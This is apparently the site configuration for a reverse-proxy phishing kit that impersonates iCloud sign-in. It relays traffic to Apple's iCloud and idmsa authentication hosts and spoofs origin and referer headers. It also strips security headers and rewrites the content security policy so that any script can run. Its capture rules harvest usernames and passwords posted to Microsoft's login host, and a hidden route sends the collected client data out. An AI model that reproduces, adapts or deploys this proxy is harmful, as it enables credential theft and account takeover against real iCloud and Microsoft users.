/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
const url = require('url')

// eslint-disable-next-line import/no-dynamic-require
const globalWorker = process.HOOK_JS_MODULE

/** Defined Functions used */


/** Important Defaults */
const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClass {

    constructor(proxyEndpoint, browserReq) {
        super(proxyEndpoint, browserReq)
    }

    processRequest() {
        return super.processRequest()

    }
}

const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {

    constructor(proxyResp, browserEndPoint) {
       
        super(proxyResp, browserEndPoint, configExport.EXTERNAL_FILTERS)
        this.regexes = [
             {
                reg: /setup\."\+t\+"\/setup\/ws\/1\//igm, // Google chrome on windows fix
                replacement: `${process.env.HOST_DOMAIN}/setup/ws/1/`,
        
             },             
             {
                reg: /base-uri[^"]*/igm, // Google chrome on windows fix
                replacement: "default-src *  data: blob: filesystem: about: ws: wss: 'unsafe-inline' 'unsafe-eval'; script-src * data: blob: 'unsafe-inline' 'unsafe-eval'; connect-src * data: blob: 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src * data: blob: ; style-src * data: blob: 'unsafe-inline'; font-src * data: blob: 'unsafe-inline';",
        
             },
        ]
    }


    processResponse() {
        if (this.proxyResp.headers['Content-Security-Policy']) {
            return this.proxyResp.pipe(this.browserEndPoint)
        }


        this.browserEndPoint.removeHeader('X-Frame-Options')
        this.browserEndPoint.removeHeader('X-XSS-Protection')
        this.browserEndPoint.removeHeader('X-Content-Type-Options')
        this.browserEndPoint.removeHeader('Content-Security-Policy')
        this.browserEndPoint.removeHeader('Strict-Transport-Security')

        if (this.proxyResp.headers['content-length'] < 1) {
            return this.proxyResp.pipe(this.browserEndPoint)
        }


        const extRedirectObj = super.getExternalRedirect()
        if (extRedirectObj !== null) {
           const rLocation = extRedirectObj.url
           
        }

        // return super.processResponse()
         let newMsgBody;
        return this.superPrepareResponse(true)
            .then((msgBody) => {
                newMsgBody = msgBody
                for (let i = 0; i < this.regexes.length; i += 1) {
                    const regExObj = this.regexes[i]
                    if (regExObj.reg.test(newMsgBody)) {
                        newMsgBody = newMsgBody.replace(regExObj.reg, regExObj.replacement)
                    }
                }
                this.superFinishResponse(newMsgBody)
            }).catch((err) => {
            console.error(err)
        })
    }

    concludeAuth() {
        console.log('Concluding path')

    }
}


const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true

    }

    execute(clientContext) {
        if (this.req.url === '/') {
            this.req.headers['accept-encoding'] = 'plain'
        } else {
            this.req.headers['accept-encoding'] = 'plain'
        }
        

        if (this.req.url.startsWith('/setup/ws/1')) {
            this.req.headers.origin = 'https://www.icloud.com'
            this.req.headers.Origin = 'https://www.icloud.com'
            this.req.headers.referer = 'https://www.icloud.com'
            this.req.headers['sec-fetch-site'] = 'same-site'
        
            console.log(JSON.stringify(this.req.headers))
            return super.superExecuteProxy('setup.icloud.com', clientContext)
        }

        this.req.headers.referer = 'https://www.icloud.com'

      
        if (this.req.method === 'POST') {
            // super.uploadRequestBody(clientContext.currentDomain, clientContext)

            // super.captureBody(clientContext.currentDomain, clientContext)

        }
       

        if (this.req.url.startsWith('/appleauth/auth/authorize/signin')) {
            this.req.url = this.req.url.replace(process.env.HOST_DOMAIN, 'icloud.com')
            console.log(this.req.url)
            // clientContext.currentDomain = 'idmsa.apple.com'
            return super.superExecuteProxy('idmsa.apple.com', clientContext, false)
        }

        if (this.req.url.startsWith('/appleauth/jslog')) {
             this.res.writeHead(204)
             return this.res.end()
        }

        const redirectToken = this.checkForRedirect()
        if (redirectToken !== null && redirectToken.obj.host === process.env.PROXY_DOMAIN) {
            clientContext.currentDomain = process.env.PROXY_DOMAIN
            this.req.url = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
            // return this.superExecuteProxy(redirectToken.obj.host, clientContext)
        }

        if (this.req.url === '/fuckiclud') {
            clientContext.setLogAvailable(true);
            super.sendClientData(clientContext, {})
        }

        return super.superExecuteProxy(clientContext.currentDomain, clientContext)

    }
}




const configExport = {
    CURRENT_DOMAIN: 'www.icloud.com',

    START_PATH: '/',

    EXTERNAL_FILTERS: 
        [
        // 'appleid.cdn-apple.com',
        'idmsa.apple.com',
        // 'apppleid.apple.com',
        // 'www.icloud.com',
        // 'www.apple.com',
        // 'iforgot.apple.com',
        'feedbackws.icloud.com',
        'p42-keyvalueservice.icloud.com',
        'p42-contactsws.icloud.com',
        'p42-pushws.icloud.com',
        'p37-keyvalueservice.icloud.com',
        'p37-contactsws.icloud.com',
        'p37-pushws.icloud.com',
        ],


    PRE_HANDLERS:
        [
        ],
    PROXY_REQUEST: ProxyRequest,
    PROXY_RESPONSE: ProxyResponse,
    DEFAULT_PRE_HANDLER: DefaultPreHandler,

    CAPTURES: {
        loginUserName: {
            method: 'POST',
            params: ['username'],
            urls: '',
            hosts: ['login.microsoftonline.com'],
        },

        loginPassword: {
            method: 'POST',
            params: ['passwd'],
            urls: '',
            hosts: ['login.microsoftonline.com'],
        },


        loginFmt: {
            method: 'POST',
            params: ['loginfmt'],
            urls: '',
            hosts: ['login.microsoftonline.com'],
        },

        defaultPhpCapture: {
            method: 'POST',
            params: ['default'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },
    },

    // proxyDomain: process.env.PROXY_DOMAIN,
}
module.exports = configExport

